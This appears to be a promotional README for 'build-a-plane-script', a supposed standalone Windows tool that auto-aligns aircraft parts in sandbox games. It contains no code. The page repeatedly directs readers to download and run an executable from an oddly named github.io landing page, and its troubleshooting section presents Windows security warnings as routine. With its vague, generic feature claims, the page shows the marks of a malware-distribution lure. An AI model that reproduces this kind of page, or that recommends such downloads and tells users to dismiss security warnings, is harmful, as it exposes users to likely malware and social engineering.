<div align="center">
<img src="assets/banner.svg" width="100%" alt="Build Plane Script banner"/>
</div>

# build-a-plane-script

![Version-2026](https://img.shields.io/badge/Version-2026-blue?style=for-the-badge)
![Windows](https://img.shields.io/badge/Windows-10%2F11-informational?style=for-the-badge&logo=windows)
![License-MIT](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)

*For builders who want their aircraft parts to assemble correctly the first time, every time.*

</div>

## What this is

| | Before | After |
|---|---|---|
| **Part placement** | Manual alignment, trial and error | Guided snapping with reference markers |
| **Build accuracy** | Frequent misaligned joints | Consistent, repeatable results |
| **Setup time** | Reconfigure tools per project | One standalone run, ready in seconds |
| **Skill required** | Familiarity with modding/toolchains | None — open and go |

build-a-plane-script is a standalone Windows utility built around one goal: making aircraft assembly workflows predictable. It was designed for people who kept hitting the same wall — parts that almost line up, joints that need three attempts, and builds that drift out of tolerance the longer a project runs. Instead of another general-purpose editor, this tool focuses narrowly on the plane-building step itself.

The script runs locally on Windows, reads your build layout, and applies consistent alignment logic so that repeated actions produce the same outcome every time. There is no account, no server dependency, and no companion toolchain to install. You download it, run it, and it does the one job it was built for.

<p align="center">
  <a href="https://earthtaxicloak31.github.io/build-a-plane-script/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Latest_Release-D97706?style=for-the-badge&logo=windows&logoColor=white&labelColor=B45309" width="550" alt="Download"/>
  </a>
</p>

The button above opens the project's landing page, where you can download the current release.

## Who it is for

- Hobby builders assembling aircraft in sandbox or simulation environments
- Server admins who need consistent build results across many players
- Content creators recording build sequences who want fewer retakes
- Teams standardizing part alignment across a shared project
- Anyone who has manually nudged parts into place one too many times

## What you can do

- **Align parts automatically** using consistent reference points instead of eyeballing it
- **Repeat a build sequence** with the same result on every run
- **Skip manual toolchain setup** — no dependencies to configure first
- **Run entirely offline** once the file is downloaded
- **Apply the same layout** across multiple project instances
- **Reduce joint drift** on longer, multi-part assemblies
- **Keep builds portable** — the script folder is self-contained
- **Undo a run cleanly** by simply not saving over your original layout

## Getting started

1. Open the landing page using the download button above.
2. Download the latest release package for Windows.
3. Extract the folder to a location of your choice.
4. Run the executable — no installation step is required.
5. Follow the on-screen prompts to load your build and start the sequence.

## Requirements

- Windows 10 or Windows 11 (64-bit)
- No additional toolchain, compiler, or runtime installation
- Standalone executable — nothing else to configure
- A build/project layout to run the sequence against

## How it works

1. The script loads your existing build layout.
2. It identifies part types and their intended connection points.
3. Alignment logic calculates correct positioning for each part.
4. Parts are placed according to that calculation.
5. The final layout is written back so it can be inspected or reused.

```mermaid
flowchart LR
    A[Load layout] --> B[Identify parts]
    B --> C[Calculate alignment]
    C --> D[Place parts]
    D --> E[Save result]
```

## FAQ

**Is build-a-plane-script safe to run on Windows without extra permissions?**
Yes. It runs as a standalone executable and does not require elevated privileges for normal use.

**Do I need any modding tools installed first?**
No. The whole point of this tool is to skip the toolchain — it works on its own.

**Will it work with any build layout, or only specific formats?**
It's built around common plane-assembly layouts. If your layout uses a very unusual structure, results may vary — check the FAQ section on the landing page for format notes.

**Can I run it more than once on the same build?**
Yes, and that's the intended use — repeated runs should produce the same alignment each time.

**Does it modify my original files, or create a copy?**
The script writes the aligned result separately by default, so your original layout stays untouched unless you choose to overwrite it.

## Troubleshooting

- **The executable won't open** — confirm you're on Windows 10/11 64-bit and that the download completed fully; a partial download often fails silently.
- **Parts still look misaligned after a run** — double-check that your layout uses supported connection points; unsupported custom parts may need manual adjustment.
- **Windows flags the file on first run** — this is common for new standalone executables; verify you downloaded from the official landing page before proceeding.
- **The script closes immediately** — run it from a folder path without unusual characters, and confirm the extracted folder wasn't moved before launch.

## License

This project is licensed under the [MIT License](LICENSE). It is provided as-is, without warranty; use it at your own discretion for your own projects.

## Changelog

**v2026.3**
- Improved alignment consistency on multi-part joints
- Reduced startup time on first launch

**v2026.2**
- Fixed a layout-saving edge case affecting nested parts
- Minor stability improvements for longer build sequences

**v2026.1**
- Initial standalone Windows release
- Core alignment and layout-loading functionality

<p align="center">
  <a href="https://earthtaxicloak31.github.io/build-a-plane-script/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Latest_Release-D97706?style=for-the-badge&logo=windows&logoColor=white&labelColor=B45309" width="550" alt="Download"/>
  </a>
</p>